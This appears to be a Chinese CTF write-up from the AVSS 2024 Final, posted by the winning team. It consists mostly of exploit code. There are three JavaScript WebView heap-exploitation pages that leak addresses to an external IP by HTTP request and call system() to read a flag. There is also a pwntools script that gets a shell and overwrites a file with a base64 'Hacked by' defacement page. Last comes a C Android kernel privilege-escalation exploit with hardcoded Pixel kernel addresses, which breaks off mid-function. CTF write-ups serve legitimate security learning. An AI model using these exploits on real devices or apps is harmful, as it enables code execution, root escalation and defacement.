# AVSS 2024 Final Writeup

> 原文: https://www.ctfiot.com/213863.html
> ID: 213863

本次 AVSS 2024 Final，我们 Polaris 战队排名第1。

排名
队伍
总分

1
Polaris
8440.96

2
Nu1L
5308.2

3
emmmmmmm2024
3624.88

4
AAA
1624

5
r3kapig
820.12

文末:

欢迎师傅们加入我们:

星盟安全团队纳新群1:
222328705

星盟安全团队纳新群2:
346014666

有兴趣的师傅欢迎一起来讨论!

PS:
团队纳新简历投递邮箱：

xmcve@qq.com

责任编辑：@Elite


```
<!DOCTYPE html>
<html>
<head>
    <title></title>
    <script type="text/javascript">
        var xhr = new XMLHttpRequest();
        function stringToHex(str) {
           var val="";
           for(var i = 0; i < str.length; i++){
              val += str.charCodeAt(i).toString(16);
           }
           return val;
       }
       function hexToString(hex) {
         var str = '';
         for (var i = 0; i < hex.length; i += 2) {
            str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
         }
         return str;
       }
       var sleep = function(time) {
         var startTime = new Date().getTime() + parseInt(time, 10);
          while(new Date().getTime() < startTime) {}
       };
       function log(info) {
          xhr.open('GET', 'http://47.109.49.88/' + info, true);
          xhr.send();
       }
 
 
       function add(index,size,key) {
            window._jsbridge.add(index,key,size);
            //sleep(1000);
       }
       function edit(index,content) {
            window._jsbridge.edit(index,stringToHex(content));
            //sleep(500);
       }
       function edit_hex(index,content) {
            window._jsbridge.edit(index,content);
            //sleep(500);
       }
       function show(index,size) {
            ans = window._jsbridge.show(index,size);
            return ans;
       }
        
       function del(index) {
            window._jsbridge.delete(index);
            //sleep(500);
       }
       function openfile(filename,mode) {
            window._jsbridge.openfile(filename,mode);
            //sleep(500);
       }
       function writefile(content) {
            window._jsbridge.writefile(stringToHex(content));
            //sleep(500);
       }
       function writefile_hex(content) {
            window._jsbridge.writefile(content);
            //sleep(500);
       }
       function readfile() {
            ans = window._jsbridge.readfile();
            //sleep(500);
            return ans;
       }

       function closefile() {
            window._jsbridge.closefile();
            //sleep(500);
       }

       function getPadding(size,c) {
            var ans = '';
            for (var i=0;i<size;i++) {
               ans += c;
            }
            return ans;
       }
       var heap_addr=null;
       var elf_base=null;
 
 
       function p32(value) {
          var t = value.toString(16);
          while (t.length != 8) {
             t = '0' + t;
          }
          var ans = t.substr(6,2) + t.substr(4,2) + t.substr(2,2) + t.substr(0,2);
          //alert(ans);
          return ans;
       }

       function u32(s) {
         hex = stringToHex(s);
         if (hex.indexOf('0x') === 0) {
            hex = hex.slice(2);
         }
         if (hex.length % 2 !== 0) {
            hex = '0' + hex;
         }
         var bytes = [];
         for (var i = 0; i < hex.length; i += 2) {
            bytes.push(hex.substr(i, 2));
         }
         bytes.reverse();
         var littleEndianHex = bytes.join('');
         return parseInt(littleEndianHex, 16);
      }

       //将系统中已有的0x100的碎片尽可能申请掉
       for (var i=0;i<10;i++) {
         add(48,0x1000,"key100");
       }
       add(49,0x1000,"key100");

       //将系统中已有的0x10的碎片尽可能申请掉
       for (var i=0;i<200;i++) {
         add(0,0x4,"key10");
       }
       //添加一些0x90的堆
       for (var i=0;i<48;i++) {
         add(i,0x90,"key" + i);
         edit(i,getPadding(0x90,String.fromCharCode(48+i)))
       }
       //间接的释放一些0x90的堆
       for (var i=0;i<48;i+=2) {
         del(i);
       }
       //重新申请0x90的堆回来
       for (var i=1;i<48;i+=2) {
         add(i,0x90,"key" + i);
       }

       //释放一个0x100的堆，用于给一些中间变量内存申请
       del(48);

       //查找堆块，找出具有相同堆指针的下标
       map = {};
       //寻找指针一样的下标
       for (var i=0;i<48;i+=2) {
         var x = stringToHex(getPadding(0x5,String.fromCharCode(48+i)));
         for (var j=1;j<48;j+=2) {
            var y = show(j,0x8);
            //log("map " + x  + "=" + y);
            if (y.indexOf(x) != -1) {
               map[i] = j;
               log("map" + i  + "=" + j);
               break;
            }
         }
       }
       //利用UAF释放，可以在具有相同指针的另一个下标进行UAF操作
       for (var i=0;i<0x48;i+=2) {
            if (map[i]) {
               del(i);
            }
       }
       log("spray done");
       //对gfileio结构体进行堆喷，让其落在UAF的堆中
       //这里不断的openfile，然后查找内存，如果找到部分字符串ta/com.avss则堆喷成功
       //注意show的参数大小size也会申请内存，会造成影响，因此采用4，影响较小
       var found = -1;
       var mode = -1;
       for (var i=0;i<200;i++) {
         openfile("for_leak",0);
         //检查是否成功堆喷站位
         for (var j in map) {
            var y = show(map[j],0x9);
            if (hexToString(y).indexOf("ta/com.a") === 0) {
               //log("success0");
               found = map[j];
               mode = 0;
               break;
            } else if (y.indexOf('dc') != -1) {
               //log("success1");
               found = map[j];
               mode = 1;
               break;
            }
         }
         if (found != -1) {
            break;
         }
       }

       var found_show = -1;
       for (var j in map) {
            var y = show(map[j],0x9);
            if (y.indexOf("100000001300000073") != -1) {
               found_show = map[j];
               break;
            }
       }
       log("found=" + found);
       //log("show=" + found_show);
       var gfileio_off;
       if (mode == 0) {
         gfileio_off = 0x38;
       } else {
         gfileio_off = 0x8;
       }

   //成功堆喷gfileio，接下来可以利用UAF进行泄漏和代码执行了
   var leak = hexToString(show(found, 0x90));
   var so_base = u32(leak.substring(gfileio_off, gfileio_off+4)) - 0x19bdc;
   var gfileio_ptr_addr =  so_base + 0x1C7C4;
   var fake_vtable = so_base + 0x19CD4;
   var bss = so_base + 0x1c7cc;
   var leak_libc = hexToString(show(found_show, 16));
   //var libc_base = u32(leak_libc.substring(12, 16)) - 0x4d100;
   var libc_base = 0xb6e92000;
   var system_addr = libc_base + 0x000246A0;
   var arg1 = 0x61616161;
   var arg2 = 0x62626262;

   var msg = "so_base=" + so_base.toString(16);
   msg += "&libc_base=" + libc_base.toString(16);
   msg += "&system_addr=" + system_addr.toString(16);
   log(msg);
   var payload = stringToHex(getPadding(gfileio_off,"a"));
   payload += p32(fake_vtable) + stringToHex(getPadding(0x18 - 4,"a"));
   payload += p32(system_addr+1) + stringToHex(";log -t FLAG `cat /data/data/com.avss.testallocator/files/flag`;");
   edit_hex(found,payload);
   log("edit done");
   //sleep(15000);

   var payload2 = stringToHex(getPadding(0xC,"b"));
   payload2 += p32(gfileio_ptr_addr)
   writefile_hex(payload2);
 
    </script>
</head>
 
 

  haivk

</html>
<!DOCTYPE html>
<html>
<head>
    <title></title>
    <script type="text/javascript">
        var xhr = new XMLHttpRequest();
        function stringToHex(str) {
           var val="";
           for(var i = 0; i < str.length; i++){
              val += str.charCodeAt(i).toString(16).padStart(2,'0');
           }
           return val;
       }
       function hexToString(hex) {
         var str = '';
         for (var i = 0; i < hex.length; i += 2) {
            str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
         }
         return str;
       }
       var sleep = function(time) {
         var startTime = new Date().getTime() + parseInt(time, 10);
          while(new Date().getTime() < startTime) {}
       };
       function log(info) {
          xhr.open('GET', 'http://47.109.49.88/' + info, true);
          xhr.send();
       }
 
 
       function add(index,size,key) {
            window._jsbridge.add(index,key,size);
            //sleep(1000);
       }
       function edit(index,content) {
            window._jsbridge.edit(index,stringToHex(content));
            //sleep(500);
       }
       function edit_hex(index,content) {
            window._jsbridge.edit(index,content);
            //sleep(500);
       }
       function show(index,size) {
            ans = window._jsbridge.show(index,size);
            return ans;
       }
        
       function del(index) {
            window._jsbridge.delete(index);
            //sleep(500);
       }
       function openfile(filename,mode) {
            window._jsbridge.openfile(filename,mode);
            //sleep(500);
       }
       function writefile(content) {
            window._jsbridge.writefile(stringToHex(content));
            //sleep(500);
       }
       function writefile_hex(content) {
            window._jsbridge.writefile(content);
            //sleep(500);
       }
       function readfile() {
            ans = window._jsbridge.readfile();
            //sleep(500);
            return ans;
       }

       function closefile() {
            window._jsbridge.closefile();
            //sleep(500);
       }

       function getPadding(size,c) {
            var ans = '';
            for (var i=0;i<size;i++) {
               ans += c;
            }
            return ans;
       }
       var heap_addr=null;
       var elf_base=null;
 
 
       function p32(value) {
          var t = value.toString(16);
          while (t.length != 8) {
             t = '0' + t;
          }
          var ans = t.substr(6,2) + t.substr(4,2) + t.substr(2,2) + t.substr(0,2);
          //alert(ans);
          return ans;
       }

       function p64(value) {
          var t = value.toString(16);
          while (t.length != 16) {
             t = '0' + t;
          }
          var ans = t.substr(14,2) + t.substr(12,2) + t.substr(10,2) + t.substr(8,2) + t.substr(6,2) + t.substr(4,2) + t.substr(2,2) + t.substr(0,2);
          //alert(ans);
          return ans;
       }

       function u32(s) {
         hex = stringToHex(s);
         if (hex.indexOf('0x') === 0) {
            hex = hex.slice(2);
         }
         if (hex.length % 2 !== 0) {
            hex = '0' + hex;
         }
         var bytes = [];
         for (var i = 0; i < hex.length; i += 2) {
            bytes.push(hex.substr(i, 2));
         }
         bytes.reverse();
         var littleEndianHex = bytes.join('');
         return parseInt(littleEndianHex, 16);
      }

      //泄漏libc
      for (var i=0;i<10;i++) {
         add(i,0xa6f-0x8,"leak");
       }
       for (var i=0;i<10;i+=2) {
         del(i);
       }
       //fopen时申请的堆大小为0xa6f
       for (var i=0;i<100;i++) {
         openfile("libc_leak",1);
       }
       for (var i=0;i<10;i+=2) {
         del(i);
       }
       var libc_base = -1;
       var system_addr = -1;
       var heap_addr = -1;
       var leak;
       for (var i=0;i<50;i++) {
         add(49,0xa6f-0x8,"leak");
         x = show(49,0x60);
         if (x.substring(0x90,0x92) == "c0" && x.substring(0xa0,0xa2) == "c8") {
            leak = hexToString(x);
            libc_base = u32(leak.substring(0x48, 0x50)) - 0x731c0;
            system_addr = libc_base + 0x64144;
            heap_addr = u32(leak.substring(0x8, 0x10));
            log("libc_base=" + libc_base.toString(16) + "&system_addr=" + system_addr.toString(16) + "&heap_addr=" + heap_addr.toString(16));
            break;
         }
         
       }
       
       //将系统中已有的0x18的碎片尽可能申请掉
       for (var i=0;i<200;i++) {
         add(0,0x18,"alloc");
       }

       //记录每个堆溢出的8字节内容
       overflow_map = {};
       //记录每个堆的前一个堆是哪个
       prev_map = {};
       prev_map_values = [];

       //添加一些0x18的堆
       for (var i=0;i<32;i++) {
         add(i,0x18,"key" + i);
         edit(i,getPadding(0x18,String.fromCharCode(48+i)))
       }

       //记录每个堆块的超出8字节的内容
       for (var i=0;i<32;i++) {
         var y = show(i,0x20).substring(0x30,0x40);
         //搜索keyxxxx
         overflow_map[i] = y;
         var k = hexToString(y);
         if (k.indexOf("key") == 0) {
            var n = parseInt(k.substring(3));
            log("prev_map" + n  + "=" + i);
            prev_map[n] = i;
            prev_map_values.push(i);
         }
       }

       //释放一些0x18的堆
       for (var i=0;i<32;i++) {
         //不要释放作为某个堆的前一个堆
         if (prev_map_values.indexOf(i) != -1)
            continue;
         del(i);
       }
       //重新申请0x18的堆回来
       for (var i=32;i<49;i++) {
         add(i,0x18,"key" + i);
       }

       //查找堆块，找出具有相同堆指针的下标
       map = {};
       //寻找指针一样的下标
       for (var i=0;i<32;i++) {
         if (prev_map_values.indexOf(i) != -1)
            continue;
         var x = overflow_map[i];
         for (var j=32;j<49;j++) {
            var y = show(j,0x20);
            //log("map " + x  + "=" + y);
            if (y.substring(0x30,0x40) == x) {
               map[i] = j;
               log("map" + i  + "=" + j);
               break;
            }
         }
       }
       //利用UAF释放，可以在具有相同指针的另一个下标进行UAF操作
       for (var i=0;i<32;i++) {
            if (map[i]) {
               del(i);
            }
       }
       log("spray done");
       //对gfileio结构体进行堆喷，让其落在UAF的堆中
       //这里不断的openfile，然后查找内存，如果找到部分字符串ta/com.avss则堆喷成功
       //注意show的参数大小size也会申请内存，会造成影响，因此采用4，影响较小
       var found = -1;
       var mode = -1;
       var pre = -1;
       for (var i=0;i<300;i++) {
         openfile("spray_gfileio",0);
         //检查是否成功堆喷站位
         for (var j in map) {
            if (prev_map[j]) {
               //log("prev_map" + j  + "=" + prev_map[j]);
               var y = show(prev_map[j],0x20);
               if (y.substring(0x30,0x32) == "08" && y.substring(0x33,0x34) == "3") {
                  found = map[j];
                  pre = prev_map[j];
                  break;
               }
            }
         }
         if (found != -1) {
            break;
         }
       }
       log("found=" + found + "&pre=" + pre);

   //成功堆喷gfileio，接下来可以利用UAF进行泄漏和代码执行了
   leak = hexToString(show(pre, 0x20));
   var so_base = u32(leak.substring(0x18, 0x20)) - 0x34308;
   //ldp x1, x0, [x0, #8] ; br x1
   var gadget_addr = libc_base + 0x66078;
   edit_hex(49,stringToHex(getPadding(0x18,"a")) + p64(gadget_addr) + stringToHex("log -t FLAG `cat /data/data/com.avss.testallocator/files/flag`"));
   var fake_vtable = heap_addr;
   var msg = "so_base=" + so_base.toString(16);
   log(msg);
   var payload = stringToHex(getPadding(0x18,"b")) + p64(fake_vtable);
   edit_hex(pre,payload);
   payload = p64(system_addr) + p64(heap_addr + 0x10);
   edit_hex(found,payload);
   log("edit done");
   //sleep(15000);

   writefile("trigger");
 
    </script>
</head>
 
 

  haivk

</html>
<!DOCTYPE html>
<html>
<head>
    <title></title>
    <script type="text/javascript">
        var xhr = new XMLHttpRequest();
        function stringToHex(str) {
           var val="";
           for(var i = 0; i < str.length; i++){
              val += str.charCodeAt(i).toString(16).padStart(2,'0');
           }
           return val;
       }
       function hexToString(hex) {
         var str = '';
         for (var i = 0; i < hex.length; i += 2) {
            str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
         }
         return str;
       }
       var sleep = function(time) {
         var startTime = new Date().getTime() + parseInt(time, 10);
          while(new Date().getTime() < startTime) {}
       };
       function log(info) {
          xhr.open('GET', 'http://47.109.49.88/' + info, true);
          xhr.send();
       }
 
 
       function add(index,size,key) {
            window._jsbridge.add(index,key,size);
            //sleep(1000);
       }
       function edit(index,content) {
            window._jsbridge.edit(index,stringToHex(content));
            //sleep(500);
       }
       function edit_hex(index,content) {
            window._jsbridge.edit(index,content);
            //sleep(500);
       }
       function show(index,size) {
            ans = window._jsbridge.show(index,size);
            return ans;
       }
        
       function del(index) {
            window._jsbridge.delete(index);
            //sleep(500);
       }
       function openfile(filename,mode) {
            window._jsbridge.openfile(filename,mode);
            //sleep(500);
       }
       function writefile(content) {
            window._jsbridge.writefile(stringToHex(content));
            //sleep(500);
       }
       function writefile_hex(content) {
            window._jsbridge.writefile(content);
            //sleep(500);
       }
       function readfile() {
            ans = window._jsbridge.readfile();
            //sleep(500);
            return ans;
       }

       function closefile() {
            window._jsbridge.closefile();
            //sleep(500);
       }

       function getPadding(size,c) {
            var ans = '';
            for (var i=0;i<size;i++) {
               ans += c;
            }
            return ans;
       }
       var heap_addr=null;
       var elf_base=null;
 
 
       function p32(value) {
          var t = value.toString(16);
          while (t.length != 8) {
             t = '0' + t;
          }
          var ans = t.substr(6,2) + t.substr(4,2) + t.substr(2,2) + t.substr(0,2);
          //alert(ans);
          return ans;
       }

       function p64(value) {
          var t = value.toString(16);
          while (t.length != 16) {
             t = '0' + t;
          }
          var ans = t.substr(14,2) + t.substr(12,2) + t.substr(10,2) + t.substr(8,2) + t.substr(6,2) + t.substr(4,2) + t.substr(2,2) + t.substr(0,2);
          //alert(ans);
          return ans;
       }

       function u32(s) {
         hex = stringToHex(s);
         if (hex.indexOf('0x') === 0) {
            hex = hex.slice(2);
         }
         if (hex.length % 2 !== 0) {
            hex = '0' + hex;
         }
         var bytes = [];
         for (var i = 0; i < hex.length; i += 2) {
            bytes.push(hex.substr(i, 2));
         }
         bytes.reverse();
         var littleEndianHex = bytes.join('');
         return parseInt(littleEndianHex, 16);
      }

       //添加一些0xac0的堆
       for (var i=0;i<32;i++) {
         add(i,0xac0-0x8,"key" + i);
         edit(i,getPadding(0xac0-0x8,String.fromCharCode(48+i)))
       }

       //释放一些0xac0的堆
       for (var i=0;i<32;i+=2) {
         del(i);
       }
       //重新申请0xac0的堆回来
       for (var i=32;i<49;i++) {
         add(i,0xac0-0x8,"key" + i);
       }

       //查找堆块，找出具有相同堆指针的下标
       map = {};
       //寻找指针一样的下标
       for (var i=0;i<32;i+=2) {
         var x = stringToHex(getPadding(0x10,String.fromCharCode(48+i)));
         for (var j=32;j<49;j++) {
            var y = show(j,0x10);
            //log("map " + x  + "=" + y);
            if (y == x) {
               map[i] = j;
               log("map" + i  + "=" + j);
               break;
            }
         }
       }
       //利用UAF释放，可以在具有相同指针的另一个下标进行UAF操作
       for (var i=0;i<32;i+=2) {
            if (map[i]) {
               del(i);
            }
       }
       log("spray done");
       //对FILE结构体进行堆喷，让其落在UAF的堆中
       //这里不断的openfile，然后查找内存
       //注意show的参数大小size也会申请内存，会造成影响
       var found = -1;
       var libc_base = -1;
       var system_addr = -1;
       var heap_addr = -1;
       var leak;
       for (var i=0;i<100;i++) {
         openfile("spray_FILE",1);
         //检查是否成功堆喷站位
         for (var j in map) {
            var x = show(map[j],0x60);
            //log("x=" + x);
            if ((x.substr(0x90,0x2) == "58" && x.substr(0xa0,0x2) == "d0")) {
               leak = hexToString(x);
               //__sclose
               libc_base = u32(leak.substr(0x48, 8)) - 0xA8C58;
               system_addr = libc_base + 0x60CC4;
               heap_addr = u32(leak.substr(0x8, 6) + "  ");
               found = map[j];
               break;
            }
         }
         if (found != -1) {
            break;
         }
       }
       log("heap_addr=" + heap_addr.toString(16));
       log("libc_base=" + libc_base.toString(16) + "&system_addr=" + system_addr.toString(16));
       
       //log("found=" + found);

   //成功堆喷FILE，接下来可以利用UAF进行泄漏和代码执行了
   var payload = show(found,0x40);
   payload += p64(heap_addr + 0x60)
   payload += p64(system_addr);
   payload += p64(0) + p64(0);
   payload += p64(1);
   payload += p64(heap_addr - 0x10);
   payload += stringToHex('log -t FLAG `cat /data/data/com.avss.testallocator/files/flag`');
   edit_hex(found,payload);
   log("edit done");
   //sleep(15000);

   closefile();
 
    </script>
</head>
 
 

  haivk

</html>
    #coding:
utf8
from pwn import *

    #sh = process(argv=['./qemu-aarch64','-L','./','./libpa.so'])
libc = ELF('./system/lib64/libc.so')

    #sh = process(argv=['./qemu-aarch64','-L','./','-g','1235','./libpa.so'])
sh = remote('192.168.10.16',12345)

    #sh = remote('172.20.10.6',12345)
    #libc = ELF('./libc11.so')

def add(size,content):
   sh.sendlineafter('Your choice:','1')
   sh.sendlineafter('size:',str(size))
   sh.sendafter('content:',content)

def edit(index,content):
   sh.sendlineafter('Your choice:','2')
   sh.sendlineafter('index:',str(index))
   sh.sendafter('content:',content)

def delete(index):
   sh.sendlineafter('Your choice:','3')
   sh.sendlineafter('index:',str(index))

def show(index):
   sh.sendlineafter('Your choice:','4')
   sh.sendlineafter('index:',str(index))

add(0x18,'a'*0x18) #0
add(0x40,'b'*0x40) #1
delete(0)
for i in range(2,16):
   add(0x18,'b'*0x18)
   delete(i)

delete(1)
    #fake Node struct
    #set size = 0x20
add(0x18,b'c'*0x8 + p32(0x20) + b'n') #16
for i in range(17,31):
   add(0x18,b'd'*0x18)
   delete(i)

add(0x18,b'd'*0x18) #31
show(0)
sh.recv(1)
sh.recv(0x10)
heap_addr = u64(sh.recv(8)) & 0xffffffffffff
print('heap_addr=',hex(heap_addr))
leak_ptr_addr = heap_addr - 0x281f0
print('leak_ptr_addr=',hex(leak_ptr_addr))
    #guess tag
for i in range(0x10):
   #fake 31 Node struct
   edit(0,b'a'*0x8 + p32(0x8) + p32(0) + p64((i << 56) + leak_ptr_addr) + b'n')
   show(31)
   sh.recv(1)
   leak_value = u64(sh.recv(8))
   if leak_value & 0xFF == 0xdc:
      print('found TAG=',hex(i))
      break

elf_base = leak_value - 0x12adc
# ldr x9, [x21] ldr x0, [x8] ; mov x1, x19 ; blr x9
gadget_addr = elf_base + 0x9BC70
putchar_got_addr = elf_base + 0xc44a8
print('elf_base=',hex(elf_base))
    #leak libc
edit(0,b'a'*0x8 + p32(0x8) + p32(0) + p64(putchar_got_addr) + b'n')
show(31)
sh.recv(1)
libc_base = u64(sh.recv(8)) - libc.sym['putchar']
system_addr = libc_base + libc.sym['system']
print('libc_base=',hex(libc_base))
print('system_addr=',hex(system_addr))

free_vtable_addr = elf_base + 0xCF148
bss = elf_base + 0xCF2E0
arg0_ptr_addr = elf_base + 0xcf000
heap_arr_addr = elf_base + 0xCF188

cmd = b'/bin/shx00'
    #fake a vtable
edit(0,b'a'*0x8 + p32(0x100) + p32(0) + p64(bss) + b'n')
edit(31,cmd.ljust(0x28,b'b') + p64(system_addr) + b'n')

    #set free vtable ptr to fake
edit(0,b'a'*0x8 + p32(0x100) + p32(0) + p64(free_vtable_addr) + b'n')
edit(31,p64(bss) + b'n')

    #trigger
delete(31)
sleep(1)
    #run shell to replace /sdcard/Documents/cache.html
sh.sendline('echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+SGFja2VkIGJ5IEhhMXZrPC90aXRsZT4KICAgIDxzdHlsZT4KICAgICAgICBib2R5IHsKICAgICAgICAgICAgbWFyZ2luOiAwOwogICAgICAgICAgICBiYWNrZ3JvdW5kOiBibGFjazsKICAgICAgICAgICAgY29sb3I6ICMwMGZmMDA7CiAgICAgICAgICAgIGZvbnQtZmFtaWx5OiAnQ291cmllciBOZXcnLCBDb3VyaWVyLCBtb25vc3BhY2U7CiAgICAgICAgICAgIG92ZXJmbG93OiBoaWRkZW47CiAgICAgICAgfQogICAgICAgIGNhbnZhcyB7CiAgICAgICAgICAgIGRpc3BsYXk6IGJsb2NrOwogICAgICAgICAgICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgICAgICAgICAgIHRvcDogMDsKICAgICAgICAgICAgbGVmdDogMDsKICAgICAgICB9CiAgICAgICAgLm1lc3NhZ2UgewogICAgICAgICAgICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgICAgICAgICAgIHRvcDogNTAlOwogICAgICAgICAgICBsZWZ0OiA1MCU7CiAgICAgICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlKC01MCUsIC01MCUpOwogICAgICAgICAgICBmb250LXNpemU6IDNyZW07CiAgICAgICAgICAgIGNvbG9yOiAjMDBmZjAwOwogICAgICAgICAgICB6LWluZGV4OiAxOwogICAgICAgICAgICB0ZXh0LXNoYWRvdzogMHB4IDBweCA1cHggIzAwZmYwMDsKICAgICAgICB9CiAgICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PgoKPGRpdiBjbGFzcz0ibWVzc2FnZSI+SGFja2VkIGJ5IEhhMXZrPC9kaXY+CjxjYW52YXMgaWQ9Im1hdHJpeENhbnZhcyI+PC9jYW52YXM+Cgo8c2NyaXB0PgogICAgY29uc3QgY2FudmFzID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIm1hdHJpeENhbnZhcyIpOwogICAgY29uc3QgY3R4ID0gY2FudmFzLmdldENvbnRleHQoIjJkIik7CgogICAgY2FudmFzLndpZHRoID0gd2luZG93LmlubmVyV2lkdGg7CiAgICBjYW52YXMuaGVpZ2h0ID0gd2luZG93LmlubmVySGVpZ2h0OwoKICAgIGNvbnN0IGNoYXJhY3RlcnMgPSAiMDEyMzQ1Njc4OWFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVpAIyQlXiYqKCkiOwogICAgY29uc3QgZm9udFNpemUgPSAxNjsKICAgIGNvbnN0IGNvbHVtbnMgPSBjYW52YXMud2lkdGggLyBmb250U2l6ZTsKCiAgICBjb25zdCBkcm9wcyA9IFtdOwogICAgZm9yIChsZXQgeCA9IDA7IHggPCBjb2x1bW5zOyB4KyspIHsKICAgICAgICBkcm9wc1t4XSA9IE1hdGgucmFuZG9tKCkgKiBjYW52YXMuaGVpZ2h0OwogICAgfQoKICAgIGZ1bmN0aW9uIGRyYXcoKSB7CiAgICAgICAgY3R4LmZpbGxTdHlsZSA9ICJyZ2JhKDAsIDAsIDAsIDAuMDUpIjsKICAgICAgICBjdHguZmlsbFJlY3QoMCwgMCwgY2FudmFzLndpZHRoLCBjYW52YXMuaGVpZ2h0KTsKCiAgICAgICAgY3R4LmZpbGxTdHlsZSA9ICIjMDBmZjAwIjsKICAgICAgICBjdHguZm9udCA9IGZvbnRTaXplICsgInB4IG1vbm9zcGFjZSI7CgogICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgZHJvcHMubGVuZ3RoOyBpKyspIHsKICAgICAgICAgICAgY29uc3QgdGV4dCA9IGNoYXJhY3RlcnNbTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogY2hhcmFjdGVycy5sZW5ndGgpXTsKICAgICAgICAgICAgY3R4LmZpbGxUZXh0KHRleHQsIGkgKiBmb250U2l6ZSwgZHJvcHNbaV0gKiBmb250U2l6ZSk7CgogICAgICAgICAgICBpZiAoZHJvcHNbaV0gKiBmb250U2l6ZSA+IGNhbnZhcy5oZWlnaHQgJiYgTWF0aC5yYW5kb20oKSA+IDAuOTc1KSB7CiAgICAgICAgICAgICAgICBkcm9wc1tpXSA9IDA7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGRyb3BzW2ldKys7CiAgICAgICAgfQogICAgfQoKICAgIHNldEludGVydmFsKGRyYXcsIDMzKTsKCiAgICB3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcigncmVzaXplJywgKCkgPT4gewogICAgICAgIGNhbnZhcy53aWR0aCA9IHdpbmRvdy5pbm5lcldpZHRoOwogICAgICAgIGNhbnZhcy5oZWlnaHQgPSB3aW5kb3cuaW5uZXJIZWlnaHQ7CiAgICB9KTsKPC9zY3JpcHQ+Cgo8L2JvZHk+CjwvaHRtbD4K" | base64 -d > /sdcard/Documents/cache.html')
sleep(2)

sh.interactive()
int read_at_address_pipe(void* address, void* buf, ssize_t len) {
    int ret = 1;
    int pipes[2];

    if(pipe(pipes))
    return 1;

    if(write(pipes[1], address, len) != len)
        goto end;
    if(read(pipes[0], buf, len) != len)
        goto end;

    ret = 0;
end:
    close(pipes[1]);
    close(pipes[0]);
    return ret;
}

int write_at_address_pipe(void* address, void* buf, ssize_t len) {
    int ret = 1;
    int pipes[2];

    if(pipe(pipes))
    return 1;

    if(write(pipes[1], buf, len) != len)
        goto end;
    if(read(pipes[0], address, len) != len)
        goto end;

    ret = 0;
end:
    close(pipes[1]);
    close(pipes[0]);
    return ret;
}
    #define _GNU_SOURCE
    #include <sys/types.h>
    #include <sys/socket.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include 
    #include <errno.h>
    #include 
    #include <sys/xattr.h>
    #include <netinet/in.h>
    #include <linux/socket.h>
    #include <linux/unistd.h>
    #include <sched.h>

    #define AF_AVSS 1024
    #define AVSS_PORT 2024

/*my custom kernel
uint64_t kernel_setsockopt = 0xFFFFFFC0004E3F70;
uint64_t ksymtab___sk_backlog_rcv = 0xFFFFFFC0007A70B8;
uint64_t add_sp_40_ret = 0xFFFFFFC0004EB048;
    #define INIT_TASK 0xFFFFFFC00089A1E0
    #define TASK_OFFSET 0x240
    #define PID_OFFSET 0x300
    #define PTR_CRED_OFFSET 0x498
*/
//pixel 1 kernel
uint64_t kernel_setsockopt = 0xFFFFFFC000C402FC;
uint64_t ksymtab___sk_backlog_rcv = 0xFFFFFFC00106D740;
uint64_t add_sp_40_ret = 0xffffffc0000954fc;
size_t selinux_enforcing = 0xFFFFFFC001716ACC;
    #define INIT_TASK 0xFFFFFFC001522120
    #define TASK_OFFSET 0x3a8
    #define PID_OFFSET 0x468
    #define PTR_CRED_OFFSET 0x610

struct avss_addr {
    sa_family_t avss_family;
    uint16_t year;
    uint32_t id;
} __attribute__((packed));

struct avss_data {
    uint8_t score;
    char buff[128];
} __attribute__((packed));

int create_server(int year,int id) {
    int sockfd;
    struct avss_addr addr;
    sockfd = socket(AF_AVSS, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket failed");
        return -1;
    }

    memset(&addr, 0, sizeof(addr));
    addr.avss_family = AF_AVSS;
    addr.year = year;
    addr.id = id;

    if (bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind failed");
        close(sockfd);
        return -1;
    }
    return sockfd;
}

int client_connect(int year,int id) {
    int sockfd;
    struct avss_addr addr;

    sockfd = socket(AF_AVSS, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket failed");
        return -1;
    }

    memset(&addr, 0, sizeof(addr));
    addr.avss_family = AF_AVSS;
    addr.year = year;
    addr.id = id;

    if (connect(sockfd,(struct sockaddr *)&addr, sizeof(addr)) < 0) {
       perror("connect failed");
       close(sockfd);
       return -1;
    }
    return sockfd;
}

char payload[0x1000];
int client_thread_finished = 0;

void *client_thread(void *arg) {
   size_t serverfd = (size_t)arg;
   struct avss_data data;

   int client_fd = client_connect(2023,1);

   memset(&data, 0, sizeof(data));
   data.score = 85;  // 示例得分
   strcpy(data.buff, "Hello from client!");

   if (send(client_fd, &data, sizeof(data),0) < 0) {
       perror("sendto failed");
       close(client_fd);
       return NULL;
   }
   printf("Message sent to server.n");
   usleep(500000);
   //UAF
   close(serverfd);
   usleep(500000);
   //setxattr("/tmp", "ha1vk", payload, 0x360, 0);
   if (setxattr("/data/local/tmp", "ha1vk", payload, 0x360, 0)) {
      perror("setxattr");
   }
   sleep(5);
   client_thread_finished = 1;
   return NULL;
}

int read_at_address_pipe(void* address, void* buf, ssize_t len) {
    int ret = 1;
    int pipes[2];

    if(pipe(pipes))
    return 1;

    if(write(pipes[1], address, len) != len)
        goto end;
    if(read(pipes[0], buf, len) != len)
        goto end;

    ret = 0;
end:
    close(pipes[1]);
    close(pipes[0]);
    return ret;
}

int write_at_address_pipe(void* address, void* buf, ssize_t len) {
    int ret = 1;
    int pipes[2];

    if(pipe(pipes))
    return 1;

    if(write(pipes[1], buf, len) != len)
        goto end;
